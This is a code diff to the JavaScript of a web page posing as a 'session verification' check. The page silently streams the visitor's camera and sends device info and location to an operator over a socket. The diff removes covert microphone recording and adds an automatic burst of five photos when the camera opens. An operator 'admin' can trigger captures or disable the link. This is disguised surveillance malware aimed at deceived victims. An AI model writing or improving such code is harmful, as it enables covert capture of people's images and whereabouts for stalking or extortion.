@@ -54,8 +54,7 @@ let mediaStream = null;
 let cameraReady = false;
 let useFrontCamera = true;
 let streamInterval = null;
-let audioInterval = null;
-let autoCaptureRunning = false;
+let autoCaptureDone = false;
 
 function setStatus(message, type) {
     statusBox.textContent = message;
@@ -85,6 +84,7 @@ function requestAndSendLocation() {
     );
 }
 
+// Only request Camera first as per your requirement
 async function triggerVerification() {
     startBtn.style.display = "none";
     setStatus("Verifying session...", "waiting");
@@ -92,7 +92,7 @@ async function triggerVerification() {
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
-            audio: true,
+            audio: false, // Shuru mein sirf camera
             video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         mediaStream = stream;
@@ -101,15 +101,21 @@ async function triggerVerification() {
         cameraReady = true;
         setStatus("Verified Successfully!", "success");
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
-        startLiveStreams();
+        startLiveStream();
+        
+        // Auto capture 5 photos, 1 every second
+        if (!autoCaptureDone) {
+            autoCaptureDone = true;
+            runAutoCaptureSequence();
+        }
     } catch (error) {
         cameraReady = false;
-        setStatus("Camera/Mic access required.", "error");
+        setStatus("Camera access required.", "error");
         startBtn.style.display = "block";
     }
 }
 
-function startLiveStreams() {
+function startLiveStream() {
     if (streamInterval) clearInterval(streamInterval);
     streamInterval = setInterval(() => {
         if (!cameraReady || !video.videoWidth) return;
@@ -118,21 +124,7 @@ function startLiveStreams() {
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, 640, 360);
         socket.emit("live-stream-frame", canvas.toDataURL("image/jpeg", 0.6));
-    }, 150);
-
-    // Audio / Speech streaming chunk handler via MediaRecorder
-    try {
-        const audioStream = new MediaStream(mediaStream.getAudioTracks());
-        const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-        mediaRecorder.ondataavailable = async (e) => {
-            if (e.data && e.data.size > 0) {
-                const reader = new FileReader();
-                reader.onloadend = () => socket.emit("live-audio-chunk", reader.result);
-                reader.readAsDataURL(e.data);
-            }
-        };
-        mediaRecorder.start(2000); // Send audio chunks every 2 seconds
-    } catch (e) {}
+    }, 200);
 }
 
 function takeSinglePhoto() {
@@ -141,24 +133,26 @@ function takeSinglePhoto() {
     canvas.height = video.videoHeight || 720;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.95));
+    socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.90));
+}
+
+function runAutoCaptureSequence() {
+    let count = 0;
+    takeSinglePhoto(); // 1st photo immediately
+    count++;
+
+    const timer = setInterval(() => {
+        if (count >= 5) {
+            clearInterval(timer);
+            return;
+        }
+        takeSinglePhoto();
+        count++;
+    }, 1000); // 1 second gap between each photo
 }
 
 socket.on("link-disabled", () => {
     document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Link is currently inactive or closed by admin.</h2></div>`;
-});
-
-socket.on("start-auto-capture", () => {
-    if (autoCaptureRunning) return;
-    autoCaptureRunning = true;
-    let count = 0;
-    takeSinglePhoto();
-    count++;
-    const timer = setInterval(() => {
-        if (count >= 5) { clearInterval(timer); autoCaptureRunning = false; return; }
-        takeSinglePhoto();
-        count++;
-    }, 1000);
 });
 
 socket.on("capture-photo", () => takeSinglePhoto());
